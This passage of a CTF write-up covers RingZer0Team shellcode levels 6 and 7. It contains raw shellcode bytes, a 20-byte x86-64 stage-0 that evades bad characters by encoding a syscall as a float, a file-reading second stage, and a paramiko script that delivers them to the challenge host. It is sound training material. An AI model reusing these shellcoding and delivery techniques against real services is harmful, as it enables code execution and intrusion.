shellcode>\x31\xc9\xeb\x3f\x10\x10\x10\x11\x20\x15\x1f\x2b\x82\x1a\x11\x10\x10\x10\x10\x89\x10\x11\x10\x10\x10\x10\x10\x11\x10\x10\x10\x10\x3f\xfe\xf4\xfe\x38\x21\xb0\x3f\x3f\x3f\x3f\x3f\xfd\x3f\xfe\xf4\xa0\xf2\x37\xfe\xe7\xfe\xf4\x37\x87\x38\x86\xfe\xf5\x9f\xf1\x3f\x20\x11\x10\x90\x31\xdb\xb1\x08\xb3\x10\xdb\x04\x98\xfe\xcb\xda\x04\x88\xdb\x1c\x88\xe2\xf3\xeb\xab
    Shellcode received...
    Shellcode length (89) bytes.

    Success: Executing shellcode...

/flag/level6.flag^@
FLAG-<redacted>
Connection to shellcode.ringzer0team.com closed.
```

Got it with *one* byte to spare!

Level 7: Ultra-Violence
-----------------------

OK, I thought the last level was pretty hard, having to resort to floating point instructions to carve out a shellcode. I was shocked to see the description for level 7:

```
This level have shellcode restriction. Bad char list "\x0a\x0d\x2f\xff\x0f\x05\x68 and \x30 to \x81" max size 40 bytes.
For an unknown funky reason I decide to add couple of random bytes in your buffer after the twentieth character.
Random chunk of bytes size is based on "rand() % 20"
```

Waaaaat. A shit-ton of bad chars, plus it seems I couldn't trust whatever I sent after the twentieth bytes. This effectively cut my shellcode size to *just twenty bytes*. I could never send in a stage0 that would carve out the real shellcode, as there was simply not enough space. Instead, my stage 0 would have to read in the shellcode from the socket directly. So, I needed a way to call `syscall` to read from stdin. However, `0x0f` and `0x05` are badchars. Furthermore, where exactly would I store this newly read shellcode?

Here's what I came up with. I'll dump out stage 0 and explain it, going bit by bit (just as I did when making this monstrosity). This assembles to *exactly* 20 bytes:

```
bits 64
_start:                 
add al, _syscall-_start
fldz                    
fsub dword [rax]        
fistp dword [rax]       
sbb esi, esi            
xchg esi, edi           
sbb esi, esi            
mov dl, 0xf0            
_syscall:
dd -84907592.0          
```

First things first, we need some way to decode an encoded version of `syscall`. Again, I turned to floating point instructions. I could a zero and then subtract another float; I might be able to get the resulting integer to decode to `syscall`!

Due to the size limitation, I could only encode four bytes. The rest of the shellcode would not only need to take care of decoding these four bytes, but also setting up the registers for `syscall read`. 

```
bits 64
_start:                 ; shellcode stage0: read in stage1
add al, _syscall-_start ; point rax to encoded instruction
```

I didn't care anymore about using `rcx` as a counter and index. I needed to adjust the pointer to the right address, which contained an encoded dword. The decoding of this dword is handle by these instructions:

```
fldz                    ; setup st0
fsub dword [rax]        ; subtract encoded instruction
fistp dword [rax]       ; store them again
```

The dword that I chose to encode were actually these instructions:

```
bits 64
xchg rax,rsi
syscall
```

These would assembled to:

```
$ xxd small
0000000: 4896 0f05
```

I then turned to python:

```python
$ python
Python 2.7.3 (default, Mar 13 2014, 11:03:55) 
[GCC 4.7.2] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> 0x050f9648
84907592
```

I was lucked out here. I tried many things, but this value, stored as a negative float, did **not** contain any bad chars!

```
sbb esi, esi            ; set rsi to zero
xchg esi, edi           ; used for edi -> stdin
sbb esi, esi            ; set rsi to zero, used for rax -> read
mov dl, 0xf0            ; read in 0xf0 bytes, hopefully enough
_syscall:
dd -84907592.0          ; this is actually xchg rax, rsi; syscall but encoded as a float!
```

The `sbb` instruction is just another way of saying `sub esi, esi`. The `sub` instruction contains a bad char. Operations on `rsi` and `rdi` contained bad chars, but using `esi` and `edi` still had the desired effect of zeroing out the registers. 

Finally, just before the `syscall` would be executed, the registers look like this:

```
rsi: address of _syscall
rdi: zero (stdin)
rax: zero (syscall read)
```

Upon executing the syscall, code execution will go into kernel space, reading from stdin *to* the address of _syscall, overwriting the instructions that come after it. 

Which lead me to another problem: how do we send the shellcode? I couldn't send raw bytes over `ssh`. One option was to encode the shellcode again, using an alphanumeric carver. I decided to put that option on hold. I tried to port-forward the ssh connection so that I could use python and sockets to get the flag; didn't work. Instead, I had to turn to some paramiko black magic. Behold, `fullauto.py`!

```python
import paramiko
import time

ssh = paramiko.SSHClient()
# fix missing hostkey -> https://stackoverflow.com/questions/10670217/paramiko-unknown-server
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())   
ssh.connect('shellcode.ringzer0team.com', username='level7', password='FLAG-<redacted>', port=7771)

# this was the only thing that worked for me. opening a channel via a transport failed miserably.
chan = ssh.invoke_shell()
time.sleep(0.2)

print chan.recv(1024)
time.sleep(0.2)

# send stage0, which will attempt to read from stdin. mind the last \n!
chan.send("\\x04\\x10\\xd9\\xee\\xd8\\x20\\xdb\\x18\\x19\\xf6\\x87\\xf7\\x19\\xf6\\xb2\\xf0\\xc9\\xf2\\xa1\\xcc\n")
time.sleep(0.2)

print chan.recv(256)
time.sleep(0.2)

# we'll need a small NOP sled to get us to the shellcode
payload = "\x90" * 20

# read in the 31 byte shellcode, designed to open/read/write a file
with open('modified-shellcode3') as f:
    data = f.read()
    payload += data
    f.close()
    
chan.send(payload+'\n')
time.sleep(0.2)

chan.send('/flag/level7.flag\x00\n')
print chan.recv(256)
time.sleep(0.2)

# receive flag!
print chan.recv(256)
```

Running this python script with the appropriate password to level 7 spat out, amongst others, *part* of the final flag!

Something funky was going on. The stage 2 was being read and executed, but the contents of the flag on the stack were being mangled. 

I finally traced it to this part of the shellcode:

```
lea rsi, [rsp]

...

mov al, 1
push rax            ; the push seems to mangle the output on the stack
pop rdi             ; fd = stdout
                    ; rsi = still pointer to buffer
                    ; rdx = still 0x7f
syscall
ret
```

Substituting it for this seemed to do the trick:

```
lea rsi, [rsp+60]

...

mov rdx, rax        ; number of bytes read; output exactly the contents of flag. it's cleaner this way
mov al, 1
push rax            ; the push seems to mangle the output on the stack
pop rdi             ; fd = stdout
                    ; rsi = still pointer to buffer
                    ; rdx = still 0x7f
syscall
ret

```

I'm still puzzled why this originally mangled the output on the stack, where I had no problems with this shellcode before. If anyone has an idea, let me know in the comments :)


Final words
-----------

Phew, what a ride! These challenges were a lot of fun and taught me several interesting concepts about x86-64 shellcoding. Thank you [RingZer0Team](http://ringzer0team.com/) for these awesome challenges!

This writeup was written in two evenings of rigorously hacking away at the keyboard (the challenges were solved over several days). Therefore, errors will probably exist. If you find any, or have any suggestion or useful remark, please feel free to leave them in the comments!

